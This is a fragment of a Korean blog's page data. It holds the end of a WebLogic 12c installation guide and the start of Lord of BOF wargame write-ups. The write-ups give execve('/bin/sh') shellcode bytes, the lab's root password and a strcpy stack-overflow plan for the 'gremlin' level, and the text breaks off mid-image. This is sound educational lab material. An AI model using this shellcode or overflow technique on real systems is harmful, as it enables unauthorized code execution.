operator\">=</span>D:\\WAS\\WebLogic12.<span class=\"token number\">2</span>.<span class=\"token number\">1</span>.<span class=\"token number\">4</span>.<span class=\"token number\">0</span>\\user<span class=\"token operator\">_</span>projects\\domains\\prac</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">LOG_DIR</span><span class=\"token operator\">=</span>D:\\WAS\\Log\\WebLogicLog\\AdminServer</span>\r\n\r\n<span class=\"token command\"><span class=\"token keyword\">cd</span> <span class=\"token variable\">%DOMAIN_HOME%</span></span>\r\n\r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> for log backup</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%DATE:~2%</span><span class=\"token operator\">_</span><span class=\"token variable\">%TIME:~0</span><span class=\"token punctuation\">,</span><span class=\"token number\">-3</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX::</span><span class=\"token operator\">=</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:</span><span class=\"token operator\">-=</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:</span> <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:</span><span class=\"token operator\">/=</span><span class=\"token operator\">%</span></span>\r\n \r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> ren <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out.<span class=\"token variable\">%PREFIX%</span></span>\r\n\r\n<span class=\"token command\"><span class=\"token keyword\">move</span> <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out.<span class=\"token variable\">%PREFIX%</span></span>\r\n \r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">USER_MEM_ARGS</span><span class=\"token operator\">=</span><span class=\"token operator\">-</span>Xms512m <span class=\"token operator\">-</span>Xmx512m <span class=\"token operator\">-</span>verbosegc</span>\r\n\r\n<span class=\"token command\"><span class=\"token keyword\">start</span> <span class=\"token parameter attr-name\">/B</span> <span class=\"token variable\">%DOMAIN_HOME%</span>\\startWebLogic.cmd > <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out <span class=\"token number\">2</span>></span><span class=\"token operator\">&amp;</span><span class=\"token command\"><span class=\"token keyword\">1</span></span>\r\n \r\n<span class=\"token command\"><span class=\"token keyword\">tail</span> <span class=\"token parameter attr-name\">-f</span> <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out</span></code></pre></div>\n<p>Managed Server 구동 스크립트</p>\n<div class=\"gatsby-highlight\" data-language=\"batch\"><pre class=\"language-batch\"><code class=\"language-batch\"><span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">ECHO</span> OFF</span>\r\n \r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">SERVER_NAME</span><span class=\"token operator\">=</span>Managed01</span>\r\n\r\n<span class=\"token command\"><span class=\"token keyword\">title</span> WebLogic_<span class=\"token variable\">%SERVER_NAME%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">DOMAIN_HOME</span><span class=\"token operator\">=</span>D:\\WAS\\WebLogic12.<span class=\"token number\">2</span>.<span class=\"token number\">1</span>.<span class=\"token number\">4</span>.<span class=\"token number\">0</span>\\user<span class=\"token operator\">_</span>projects\\domains\\prac</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">LOG_DIR</span><span class=\"token operator\">=</span>D:\\WAS\\Log\\WebLogicLog\\Managed01</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">ADM_URL</span><span class=\"token operator\">=</span><span class=\"token string\">\"t3://127.0.0.1:7001\"</span></span>\r\n\r\n<span class=\"token command\"><span class=\"token keyword\">cd</span> <span class=\"token variable\">%DOMAIN_HOME%</span></span>\r\n\r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> ######### WebLogic log backup #########</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%DATE:~2%</span><span class=\"token operator\">_</span><span class=\"token variable\">%TIME:~0</span><span class=\"token punctuation\">,</span><span class=\"token number\">-3</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX::</span><span class=\"token operator\">=</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:</span><span class=\"token operator\">-=</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:</span> <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token variable\">%PREFIX:</span><span class=\"token operator\">/=</span><span class=\"token operator\">%</span></span>\r\n \r\n<span class=\"token operator\">@</span><span class=\"token command\"><span class=\"token keyword\">REM</span> ren <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out.<span class=\"token variable\">%PREFIX%</span></span>\r\n<span class=\"token command\"><span class=\"token keyword\">move</span> <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out.<span class=\"token variable\">%PREFIX%</span></span>\r\n \r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">USER_MEM_ARGS</span><span class=\"token operator\">=</span><span class=\"token operator\">-</span>Xms1024m <span class=\"token operator\">-</span>Xmx1024m</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">USER_MEM_ARGS</span><span class=\"token operator\">=</span><span class=\"token variable\">%USER_MEM_ARGS%</span> <span class=\"token operator\">-</span>XX:<span class=\"token operator\">+</span>HeapDumpOnOutOfMemoryError</span>\r\n<span class=\"token command\"><span class=\"token keyword\">set</span> <span class=\"token variable\">USER_MEM_ARGS</span><span class=\"token operator\">=</span><span class=\"token variable\">%USER_MEM_ARGS%</span> <span class=\"token operator\">-</span>verbosegc <span class=\"token operator\">-</span>XX:<span class=\"token operator\">+</span>PrintGCDetails <span class=\"token operator\">-</span>XX:<span class=\"token operator\">+</span>PrintGCTimeStamps <span class=\"token operator\">-</span>Xloggc:<span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.gc</span>\r\n<span class=\"token command\"><span class=\"token keyword\">start</span> <span class=\"token parameter attr-name\">/B</span> <span class=\"token variable\">%DOMAIN_HOME%</span>\\bin\\startManagedWebLogic.cmd <span class=\"token variable\">%SERVER_NAME%</span> <span class=\"token variable\">%ADM_URL%</span> > <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out <span class=\"token number\">2</span>></span><span class=\"token operator\">&amp;</span><span class=\"token command\"><span class=\"token keyword\">1</span></span>\r\n \r\n<span class=\"token command\"><span class=\"token keyword\">tail</span> <span class=\"token parameter attr-name\">-f</span> <span class=\"token variable\">%LOG_DIR%</span>\\<span class=\"token variable\">%SERVER_NAME%</span>.out</span></code></pre></div>\n<p>Log_DIR에 추가적으로 생성해야 하는 폴더(AdminServer, Managed01)는 직접 만들어 주어야 한다.\r\n위의 두 스크립트를 runAdminServer.cmd, runManaged01.cmd로 이름을 붙이고 %DOMAIN_HOME%에 위치시켰다.</p>\n<p>※\r\ntail은 로그를 모니터링할 때 편리한 프로그램이다. 파일에 로그가 쌓일 때마다 실시간으로 콘솔에 띄워준다.\r\n리눅스에서 기본적으로 제공되는 프로그램인데 윈도우에서는 기본제공이 되지 않는다.\r\ntail 프로그램은 종류도 다양하고 많으니 마음에 드는 것을 다운받아 %DOMAIN_HOME%으로 옮겨주면 위의 스크립트에서 사용할 수 있다.</p>\n<p>나는 Microsoft가 배포한 <a href=\"https://www.microsoft.com/en-us/download/confirmation.aspx?id=17657\">Windows Server 2003 Resource Kit Tools</a>에 포함된 <a href=\"https://github.com/s01va/tail_for_windows\">tail.exe</a>를 사용했다.</p>\n<p><img src=\"./images/38.PNG\" alt=\"runAdminServer.cmd\"></p>\n<p><img src=\"./images/39.PNG\" alt=\"runManaged01.cmd\"></p>\n<p>두 스크립트가 잘 실행된 것을 볼 수 있다.</p>\n<h1>웹 어플리케이션 배포(Deploy)하기</h1>\n<p><a href=\"https://s01va.github.io/WAS-%ED%85%8C%EC%8A%A4%ED%8A%B8%EC%9A%A9-%EC%9B%B9-%EC%96%B4%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98-%EB%A7%8C%EB%93%A4%EA%B8%B0/\">여기</a>에서 만든 테스트용 웹 어플리케이션을 배포하려 한다.</p>\n<p>.war파일을 배포할 수도 있고, 여러가지 방법이 있지만 폴더째로 배포하는 방법이 있다.</p>\n<p>내가 테스트용으로 만든 웹 어플리케이션 webtest의 내부는 이렇게 생겼다.</p>\n<p><img src=\"./images/40.PNG\" alt=\"webtest\"></p>\n<p><img src=\"./images/41.PNG\" alt=\"webtest-WebContent\"></p>\n<p>WebContent 내부에는 META-INF, WEB-INF 등이 필히 존재하는데, 이 구조는 war파일 구조와 다르지 않다. 그리고 WEB-INF에 web.xml이 적절한 형태로 존재하면 배포시 war파일로 인식시킬 수 있다.</p>\n<p>이 WebContent 폴더를 WAS를 실행시키는 D드라이브로 복사하고 webtest로 폴더명을 바꾸었다.</p>\n<p><img src=\"./images/42.PNG\" alt=\"webtest-WebContent\"></p>\n<p>이제부터 이 폴더를 WebLogic에 배포해볼 것이다.</p>\n<p>웹로직 콘솔에 들어간다.</p>\n<p><img src=\"./images/43.PNG\" alt=\"WebLogic Console - Domain Structure\"></p>\n<p>잠금 및 편집을 누른 후 배치 - 설치를 누른다.</p>\n<p><img src=\"./images/44.PNG\" alt=\"WebLogic Console - Deploy - Install\"></p>\n<p>Deploy할 웹 어플리케이션을 폴더로 지정해 준다.</p>\n<p><img src=\"./images/45.PNG\" alt=\"WebLogic Console - Deploy - Install2\"></p>\n<p>다음을 누른다.</p>\n<p><img src=\"./images/46.PNG\" alt=\"WebLogic Console - Deploy - Install3\"></p>\n<p>다음</p>\n<p><img src=\"./images/47.PNG\" alt=\"WebLogic Console - Deploy - Install4\"></p>\n<p>다음</p>\n<p><img src=\"./images/48.PNG\" alt=\"WebLogic Console - Deploy - Install5\"></p>\n<p>나머지 설정은 기본으로 두고 소스 접근성 설정만 위와 같이 바꾸었다.</p>\n<p>완료</p>\n<p><img src=\"./images/49.PNG\" alt=\"WebLogic Console - Deploy Complete\"></p>\n<p>성공적으로 Deploy했다. 변경 내용 활성화를 눌러준다.</p>\n<p><img src=\"./images/50.PNG\" alt=\"WebLogic Console - application ready\"></p>\n<p>배포한 어플리케이션의 상태가 \"준비됨\"으로 바뀌었다. 이를 실행시키려면 콘트롤 탭으로 가야한다.</p>\n<p><img src=\"./images/51.PNG\" alt=\"WebLogic Console - application ready2\"></p>\n<p>잠금 및 편집을 누르고 해당 어플리케이션을 선택 후 시작을 누른다.</p>\n<p><img src=\"./images/52.PNG\" alt=\"WebLogic Console - application deploy\"></p>\n<p>배치 관련 Summury가 뜬다. 예를 눌러준다.</p>\n<p><img src=\"./images/53.PNG\" alt=\"WebLogic Console - application deploy complete\"></p>\n<p>어플리케이션의 상태가 Running으로 바뀐 것을 볼 수 있다.</p>\n<p>아래와 같은 URL로 접속하여 배포 성공 여부를 확인한다.</p>\n<p>localhost:[ManagedServerPort]/[DeployedAppContextroot]</p>\n<p>ManagedServerPort는 좌측의 도메인 구조 - 환경 - 서버에서도 확인할 수 있다.</p>\n<p><img src=\"./images/54.PNG\" alt=\"ManagedServerPort\"></p>\n<p>DeployedAppContextroot는 도메인 구조 - 배치 - 배포항 어플리케이션을 선택하면 볼 수 있다.</p>\n<p><img src=\"./images/55.PNG\" alt=\"DeployedAppContextroot\"></p>\n<p>자동으로 어플리케이션 이름으로 컨텍스트 루트를 설정하는 것으로 보인다.\r\n(루트로 설정하는법 아시는분..)</p>\n<p>나의 경우엔 localhost:8001/webtest로 들어가면 서비스 성공 여부를 확인할 수 있다.</p>\n<p><img src=\"./images/56.PNG\" alt=\"All Complete!\"></p>","categories":["misc","setting"],"date":"October 23, 2019","description":null,"id":"59b35656-04eb-5a94-ae7c-79c838b9a3ce","keywords":["was","weblogic","middleware"],"slug":"/Windows10-WebLogic12c/","title":"Windows 10에서 WebLogic 12c 설치하기","readingTime":{"text":"11 min read"}},{"banner":{"alt":null,"caption":null,"src":null},"body":"<p>BOF의 OS의 종류와 버전은 LOB의 VM을 통해 Red Hat Linux 6.2라는 것을 알 수 있으며 리눅스 환경이므로 ELF 파일구조를 사용함과 어셈블리어가 at&#x26;t 문법임을 유추해 낼 수 있다. 그리고 아래와 같이 i686 아키텍처이므로 32bit 메모리를 사용함을 알 수 있다.</p>\n<p><img src=\"./images/0.png\" alt=\"arch\"></p>\n<p>LOB 풀이에 사용한 쉘코드는 다음과 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80</code></pre></div>\n<p>25bytes shellcode(execve(“/bin/sh”) 사용)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\\xd9\\xc5\\xd9\\x74\\x24\\xf4\\xb8\\x15\\xc3\\x69\\xd7\\x5d\\x29\\xc9\\xb1\\x0b\\x31\\x45\\x1a\\x03\\x45\\x1a\\x83\\xc5\\x04\\xe2\\xe0\\xa9\\x62\\x8f\\x93\\x7c\\x13\\x47\\x8e\\xe3\\x52\\x70\\xb8\\xcc\\x17\\x17\\x38\\x7b\\xf7\\x85\\x51\\x15\\x8e\\xa9\\xf3\\x01\\x98\\x2d\\xf3\\xd1\\xb6\\x4f\\x9a\\xbf\\xe7\\xfc\\x34\\x40\\xaf\\x51\\x4d\\xa1\\x82\\xd6</code></pre></div>\n<p>/x2f가 없는 shellcode</p>\n<p>그리고 LOB의 default shell(bash)의 버전이 낮아 /xff의 입력을 /x00으로 받아들이는 오류가 있으므로 bash2를 사용하도록 한다. root 권한으로 이를 한꺼번에 바꾸도록 한다. root의 패스워드는 hackerschoolbof이다. root로 로그인 후 /etc/passwd를 열어 bash를 bash2로 모두 치환해준다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 487px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.7878787878788%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABx0lEQVR42oWT65KiMBSEVYRdwEACOdckKEF9/0fcCuPU3qyZ739Xd59ODtfrQogAnoWIkJmsHc0wTJMDxKZpDl9wfzxVBBEQQENIKbmduj4fvmVdMyH4eRZhYiLmGCMitG37vfh2uyKi9zMVKTGzqhChqDjnmh9N9cnpdPrPOa+qKsIiQogadFkiIYYYYlBEsNY656Z56vv+X3HOGT6c98DeexHRIBo0xjhN7uvOKzMDeEQsbQGQOaWoyqKqylV1Ou68F+/X9gDgAVRZNTAT7rN1XXf8wvnxfIgo+CImwtsrCKhqWtLk3OXSt13X9/0b823LokpEIhKClsBBrXVt+7Nt22Gn6zpjTNPU53N1PBx+t8h5E2FE3B+JhhC8B2JGBGbxfp69JyYP3gyDGYa/3Lf7FmPY1yqklEIIMaUlLarl4CyMhNZZ66ybnDHGOTvNc1kub1lVuOxcbu69jzEuKRGT7klE5WIuF2OaulBVp/NOVVXFuYi5dFaV2XsWXpYlphiCIkGI4X6/T/P0ivqZu9Quv2pfhYj2sUrz14Mr5uomN1p7Pr/7J2su3NZrXjM9cYTBjtaU0wx2HJ1zbdvWdW2thY9Wf/AL9kc5L21tMx0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/989ac234ac71783cbcb20e02fe84f6cc/c9b55/1.webp 165w,\n/static/989ac234ac71783cbcb20e02fe84f6cc/f2908/1.webp 330w,\n/static/989ac234ac71783cbcb20e02fe84f6cc/9d50c/1.webp 487w\"\n              sizes=\"(max-width: 487px) 100vw, 487px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/989ac234ac71783cbcb20e02fe84f6cc/04c57/1.png 165w,\n/static/989ac234ac71783cbcb20e02fe84f6cc/d9ecf/1.png 330w,\n/static/989ac234ac71783cbcb20e02fe84f6cc/7b439/1.png 487w\"\n            sizes=\"(max-width: 487px) 100vw, 487px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/989ac234ac71783cbcb20e02fe84f6cc/7b439/1.png\"\n            alt=\"bash2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>다음은 C언어의 stack frame structure이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 494px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 146.06060606060606%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAdCAIAAAAl5NuSAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADIElEQVR42oWU2W7jOhBE8/9/lQTIU4Ib2EY2ixItWqTEnRQXbZYHFhNP4pm5Pg+GALnUZHV13/R9Twi5u7tbr9ebzeb19XW1WpVl2TRNVVV93x//zc3xeDTGYIyNMdM0DcMwjmO3oLWOMV4Rc86zLLPWSimVUnLBGEMp7bruilgptV6v53m+eBdjvH5srTXGWErJOU9lhRBt22qtq6oihFhry7IsigIhtN1uKaWfYq01YwxjTCnd7/fNwn6/d85Za9Od53k+LKSH8xk/xUmGEEpiQkiM8UI8z/MwDPPCNE2Hw+Hz2EIIYwznXGttjFFKxRiVUhBCpRSl9Onp6fn5+b+FLMsQQkqpk7htW8aYUspa27Zt8txamxp2PB77vrcLzjljzLkFN13XCSGUUqmmtVZrnVqltQ4h/J/bQggAAMZYa805r+vaGDMsaK3zPPfe8wUhRLr5b8PyPN9sNk3TCCE4503TKKVCCOnOGOOiKG5vbx8eHj4+PqZp+lGZMVaWJcY4ZatpGmttyqkxZrvdOueklNbaP1P0mTAIIUKILKQ8JP+dc+e//l3MGAMAQAh3ux1cKIpiv1BVFaW0bdvdbielvPjE51QRQowxjDHv/blnlNIQwjAMh8NhHMeLC5/E0zQppYwx3nvnXIyxXfDeCyGuTJX3nhDy9va22+0AAO/v70IIvUAp9d6n5Nd1rbU+HA4/xKmBnPMUT2tt2gfTNDnnuq6z1qbYhhAuPLsJIRBCIIQY45Tk82wSQrqu45zv93uxcFl5HMe6rl9eXhBCEMLtdpscppSm6e37vus67/2fi+EkJoQ454ZhSJNwdjWEUFXVarW6v79/fHwEACilvnfr5DaEMM/zqqoQQkVRMMbSDFFK8zynlFZVlYwYx/FHZWttUkop27ZNHU6/yctzvP6SsLquAQBpmMIXMcZpmrTWV/ocY8yyjHP+3Y9xHKWUIQTGmBAihJAsbJrmu+GnZVAUhVpI/ZBSJqvTeDrn+r43C1rry2wrpQAATdNkWZbnOYQQABBCSJvsyt6OMVZfIITKsowxpt5O05RKzV98F/8CAspxhm3KR+sAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/88fb27ad287ebcfe7b77321ce6a8b22c/c9b55/2.webp 165w,\n/static/88fb27ad287ebcfe7b77321ce6a8b22c/f2908/2.webp 330w,\n/static/88fb27ad287ebcfe7b77321ce6a8b22c/32f69/2.webp 494w\"\n              sizes=\"(max-width: 494px) 100vw, 494px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/88fb27ad287ebcfe7b77321ce6a8b22c/04c57/2.png 165w,\n/static/88fb27ad287ebcfe7b77321ce6a8b22c/d9ecf/2.png 330w,\n/static/88fb27ad287ebcfe7b77321ce6a8b22c/d72d4/2.png 494w\"\n            sizes=\"(max-width: 494px) 100vw, 494px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/88fb27ad287ebcfe7b77321ce6a8b22c/d72d4/2.png\"\n            alt=\"[memory map of a typical C ELF executable on x86]\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>","categories":["writeup","wargame","pwnable"],"date":"February 05, 2016","description":"","id":"24316794-b5a6-57cd-971d-8ede61fe9a9f","keywords":["lob"],"slug":"/Lord-of-BOF-WriteUp-00/","title":"LOB Intro","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#080808","images":{"fallback":{"src":"/static/1efa9abc07578ed96648353152c742c0/cbade/0.png","srcSet":"/static/1efa9abc07578ed96648353152c742c0/699d3/0.png 85w,\n/static/1efa9abc07578ed96648353152c742c0/6ee12/0.png 171w,\n/static/1efa9abc07578ed96648353152c742c0/cbade/0.png 341w","sizes":"(min-width: 341px) 341px, 100vw"},"sources":[{"srcSet":"/static/1efa9abc07578ed96648353152c742c0/96d64/0.webp 85w,\n/static/1efa9abc07578ed96648353152c742c0/ceca6/0.webp 171w,\n/static/1efa9abc07578ed96648353152c742c0/fb9cf/0.webp 341w","type":"image/webp","sizes":"(min-width: 341px) 341px, 100vw"}]},"width":660,"height":400.64516129032256}}}},"body":"<p>source code:</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"argv error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Stack frame structure:</p>\n<p>| buffer[256] |\r\n| Stack Frame Pointer[4] |\r\n| Return address[4] |\r\n| argc |\r\n| argv |\r\n| environ |</p>\n<p>쉘코드를 삽입하기 위해서 몇 가지 방법을 생각해 낼 수 있다.\r\n첫째, 변수 buffer를 활용한다. 입력값의 크기를 검사하지 않는 strcpy의 특성을 이용하여, buffer에 쉘코드를 넣고 buffer와 SFP를 넘치게 하여 return address에 쉘코드가 실행되는 buffer의 주소를 계산하여 삽입하는 계획을 세운다.\r\n실행파일 gremlin은 소유주가 gremlin이므로 gate인 사용자는 디버깅을 할 수 없다. gate 소유의 디렉토리를 생성한 후 gremlin을 복사해 온 후 디버깅을 진행하도록 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 341px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.484848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA1ElEQVR42n3Nya7CMAyFYcdtaIvSdMpoOx1gwfu/IQrc3ZU46//oAxG+HlcmIsoszMKTtVKEmbx3MaXn8zGO1odwXocCUEopxKZpEBFY+DyPlHP+O5Ot50KUvXOb9/Nsl3VlESklxtB1nTHmvM5pNCD8lTMzSS14mmw59io7tzlnrS17Gc0dAKr2wRFRKQV0kBwccgghxBRjisPQJ6IiZIxZ1+Vb1/T/pte8vJZhGxpsWt1qrRGx1fqmNd4QBvi1GIMI+/CRY0wp3aucd+Z+6SH/Or8BGMQUVOGikeEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1efa9abc07578ed96648353152c742c0/c9b55/0.webp 165w,\n/static/1efa9abc07578ed96648353152c742c0/f2908/0.webp 330w,\n/static/1efa9abc07578ed96648353152c742c0/5af35/0.webp 341w\"\n              sizes=\"(max-width: 341px) 100vw, 341px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1efa9abc07578ed96648353152c742c0/04c57/0.png 165w,\n/static/1efa9abc07578ed96648353152c742c0/d9ecf/0.png 330w,\n/static/1efa9abc07578ed96648353152c742c0/4c0ad/0.png 341w\"\n            sizes=\"(max-width: 341px) 100vw, 341px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1efa9abc07578ed96648353152c742c0/4c0ad/0.png\"\n            alt=\"cp\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>gdb로 gremlin의 어셈블리어를 확인한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 430px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 155.75757575757575%; position: relative; bottom: 0; left: 0; background-image: 